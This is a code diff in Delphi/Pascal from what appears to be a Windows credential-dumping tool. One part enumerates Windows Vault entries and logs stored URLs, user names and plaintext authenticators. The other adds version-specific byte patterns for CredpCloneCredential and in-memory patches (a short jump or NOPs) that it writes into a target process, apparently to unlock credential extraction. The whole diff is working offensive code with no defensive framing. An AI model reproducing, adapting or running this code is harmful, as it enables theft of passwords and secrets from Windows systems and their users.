@@ -244,8 +244,8 @@ begin
                 log('VaultEnumerateVaults OK, '+inttostr(cbvaults));
                 for i:= 0 to cbVaults-1 do
                     begin
-                    log('*************************************************');
-                    log('item:'+inttostr(i)+ ' GUID:'+GUIDToString ( tguid(ptr^)));
+                    log('*************************************************',1);
+                    log('item:'+inttostr(i)+ ' GUID:'+GUIDToString ( tguid(ptr^)),1);
                     begin
                     //if VaultOpenVault(vaults[i]^, 0, @hVault)=0 then
                     if VaultOpenVault(@tguid(ptr^), 0, hVault)=0 then
@@ -259,13 +259,13 @@ begin
                           ptr2:=pitems;
                           for j:=0 to cbItems -1 do
                               begin
-                              log('SchemaId:'+GUIDToString (PVAULT_ITEM_8(ptr2).SchemaId ) );
+                              log('SchemaId:'+GUIDToString (PVAULT_ITEM_8(ptr2).SchemaId ),1 );
                               //log('cbProperties:'+inttostr(PVAULT_ITEM_8(ptr2).cbProperties)) ;
-                              log(inttostr(j)+' FriendlyName:'+pwidechar(PVAULT_ITEM_8(ptr2).FriendlyName) );
+                              log(inttostr(j)+' FriendlyName:'+pwidechar(PVAULT_ITEM_8(ptr2).FriendlyName),1 );
                               CopyMemory (@vie,PVAULT_ITEM_8(ptr2).Ressource ,sizeof(vie));
-                              log('URL:'+pwidechar(vie.data));
+                              log('URL:'+pwidechar(vie.data),1);
                               CopyMemory (@vie,PVAULT_ITEM_8(ptr2).Identity  ,sizeof(vie));
-                              log('User:'+pwidechar(vie.data));
+                              log('User:'+pwidechar(vie.data),1);
                               pitem8 :=nil;
                               status:= VaultGetItem8(hVault, pointer(@PVAULT_ITEM_8(ptr2).SchemaId), PVAULT_ITEM_8(ptr2).Ressource, PVAULT_ITEM_8(ptr2).Identity, PVAULT_ITEM_8(ptr2).PackageSid,0, 0, pitem8 );
                               if status=0 then
@@ -275,20 +275,20 @@ begin
                                      CopyMemory (@vie,PVAULT_ITEM_8(pItem8).Authenticator  ,sizeof(vie));
                                      if vie.veType=ElementType_String then
                                            begin
-                                           log('Authenticator:'+pwidechar(vie.data));
+                                           log('Authenticator:'+pwidechar(vie.data),1);
                                            end;
                                     //log('veType:'+inttostr(integer(vie.ItemValue.veType)));
                                     if vie.veType=ElementType_ByteArray then
                                            begin
                                            CopyMemory (@VIE_BYTE,PVAULT_ITEM_8(pItem8).Authenticator  ,sizeof(VIE_BYTE));
-                                           log('Length:'+inttostr(nativeuint(VIE_BYTE.Length )) );
-                                           log('Data:'+inttohex(nativeuint(VIE_BYTE.Value ),8) );
+                                           log('Length:'+inttostr(nativeuint(VIE_BYTE.Length )),1 );
+                                           //log('Data:'+inttohex(nativeuint(VIE_BYTE.Value ),8) );
                                            if VIE_BYTE.Length>0 then
                                                begin
                                                setlength(bytes,VIE_BYTE.Length);
                                                copymemory(@bytes[0],VIE_BYTE.Value,VIE_BYTE.Length);
                                                for k:=0 to VIE_BYTE.Length do write(bytes[k]);log('');
-                                               //dpapi is used
+                                               //dpapi is used for sure - entropy?
                                                //CryptUnProtectData_(bytes,output);
                                                end;
                                            end;
@@ -313,17 +313,62 @@ begin
 
 end;
 
-function Init_Pattern:tbytes;
+function Init_Pattern(var offset:shortint):tbytes;
 const
+  PTRN_WN60_CredpCloneCredential:array [0..7] of byte =($44, $8b, $ea, $41, $83, $e5, $01, $75);
   PTRN_WN63_CredpCloneCredential:array [0..5] of byte =($45, $8b, $f8, $44, $23, $fa);
+  PTRN_WN10_1607_CredpCloneCredential:array [0..7] of byte =($45, $8b, $e0, $41, $83, $e4, $01, $75);
+  PTRN_WN10_1703_CredpCloneCredential:array [0..7] of byte =($45, $8b, $e6, $41, $83, $e4, $01, $75);
+  PTRN_WN10_1803_CredpCloneCredential:array [0..7] of byte =($45, $8b, $fe, $41, $83, $e7, $01, $75);
+  PTRN_WN10_1809_CredpCloneCredential:array [0..8] of byte =($45, $8b, $e6, $41, $83, $e4, $01, $0f, $84);
 var
   pattern:array of byte;
 begin
 
   if LowerCase (osarch )='amd64' then
      begin
-     setlength(pattern,length(PTRN_WN63_CredpCloneCredential));
-     CopyMemory (@pattern[0],@PTRN_WN63_CredpCloneCredential[0],length(PTRN_WN63_CredpCloneCredential));
+     if copy(winver,1,3)='6.0' then //and 6.1 ?
+         begin
+         setlength(pattern,length(PTRN_WN60_CredpCloneCredential));
+         CopyMemory (@pattern[0],@PTRN_WN60_CredpCloneCredential[0],length(PTRN_WN60_CredpCloneCredential));
+         offset:=7;
+         end;
+     if copy(winver,1,3)='6.3' then
+         begin
+         setlength(pattern,length(PTRN_WN63_CredpCloneCredential));
+         CopyMemory (@pattern[0],@PTRN_WN63_CredpCloneCredential[0],length(PTRN_WN63_CredpCloneCredential));
+         offset:=6;
+         end;
+     if (pos('-1507',winver)>0) then
+         begin
+         setlength(pattern,length(PTRN_WN63_CredpCloneCredential));
+         CopyMemory (@pattern[0],@PTRN_WN63_CredpCloneCredential[0],length(PTRN_WN63_CredpCloneCredential));
+         offset:=6;
+         end;
+     if (pos('-1607',winver)>0) then
+         begin
+         setlength(pattern,length(PTRN_WN10_1607_CredpCloneCredential));
+         CopyMemory (@pattern[0],@PTRN_WN10_1607_CredpCloneCredential[0],length(PTRN_WN10_1607_CredpCloneCredential));
+         offset:=7;
+         end;
+     if (pos('-1703',winver)>0) then
+         begin
+         setlength(pattern,length(PTRN_WN10_1703_CredpCloneCredential));
+         CopyMemory (@pattern[0],@PTRN_WN10_1703_CredpCloneCredential[0],length(PTRN_WN10_1703_CredpCloneCredential));
+         offset:=7;
+         end;
+     if (pos('-1803',winver)>0) then
+         begin
+         setlength(pattern,length(PTRN_WN10_1803_CredpCloneCredential));
+         CopyMemory (@pattern[0],@PTRN_WN10_1803_CredpCloneCredential[0],length(PTRN_WN10_1803_CredpCloneCredential));
+         offset:=7;
+         end;
+     if (pos('-1809',winver)>0) then
+         begin
+         setlength(pattern,length(PTRN_WN10_1809_CredpCloneCredential));
+         CopyMemory (@pattern[0],@PTRN_WN10_1809_CredpCloneCredential[0],length(PTRN_WN10_1809_CredpCloneCredential));
+         offset:=7;
+         end;
      end
      else
      begin
@@ -335,10 +380,10 @@ end;
 
 function patch(pid:dword):boolean;
 const
-//offset x64
-//offset x86
-  after:array[0..0] of byte=($eb);
-  //after:array[0..1] of byte=($0F,$84);
+  PATC_WALL_CredpCloneCredentialJmpShort:array[0..0] of byte=($eb);
+  //for 2k3, 10.1507, 10.1809
+  PATC_WN64_CredpCloneCredentialJmpShort:array[0..5] of byte=($90, $90, $90, $90, $90, $90);
+
 var
   dummy:string;
   hprocess,hmod:thandle;
@@ -347,7 +392,7 @@ var
   cbNeeded,count:	 DWORD;
   szModName:array[0..254] of char;
   addr:pointer;
-  backup:array[0..0] of byte;
+  after,backup:array of byte; //array[0..0] of byte;
   read:cardinal;
   offset:nativeint=0;
   patch_pos:ShortInt=0;
@@ -360,13 +405,25 @@ begin
   if (lowercase(osarch)='amd64') then
      begin
      //nothing needed here
-     patch_pos:=6;
+     if (pos('-1809',winver)>0) then
+        begin
+        setlength(after,sizeof(PATC_WN64_CredpCloneCredentialJmpShort));
+        setlength(backup,sizeof(after));
+        copymemory(@after[0],@PATC_WN64_CredpCloneCredentialJmpShort[0],sizeof(PATC_WN64_CredpCloneCredentialJmpShort));
+        end
+        else
+        begin
+        setlength(after,1);
+        setlength(backup,sizeof(after));
+        copymemory(@after[0],@PATC_WALL_CredpCloneCredentialJmpShort[0],sizeof(PATC_WALL_CredpCloneCredentialJmpShort));
+        end;
      end;
   if (lowercase(osarch)='x86') then
      begin
      //nothing needed here
      end;
 
+  pattern:=Init_Pattern(patch_pos ) ;
 
   if patch_pos =0 then
      begin
@@ -402,8 +459,6 @@ begin
                             log('lpBaseOfDll:'+inttohex(nativeint(MODINFO.lpBaseOfDll),sizeof(pointer)),0 );
                             log('SizeOfImage:'+inttostr(MODINFO.SizeOfImage),0);
                             addr:=MODINFO.lpBaseOfDll;
-                            pattern:=Init_Pattern ;
-                            //offset:=search(hprocess,addr,MODINFO.SizeOfImage);
                             log('Searching...',0);
                             offset:=searchmem(hprocess,addr,MODINFO.SizeOfImage,pattern);
                             log('Done!',0);
